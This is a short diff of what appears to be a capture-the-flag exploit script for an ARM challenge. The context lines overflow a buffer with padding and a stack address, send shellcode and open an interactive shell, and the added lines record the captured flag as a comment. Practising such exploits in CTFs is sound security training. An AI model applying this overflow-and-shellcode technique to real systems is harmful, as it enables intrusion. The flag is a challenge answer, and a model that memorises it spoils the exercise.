@@ -29,3 +29,5 @@ sendline(sock,"b"*84 + pack32(sp))
 recvuntil(sock,":")
 sendline(sock,shellcode.ljust(100,"a"))
 inter(sock)
+
+# flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}
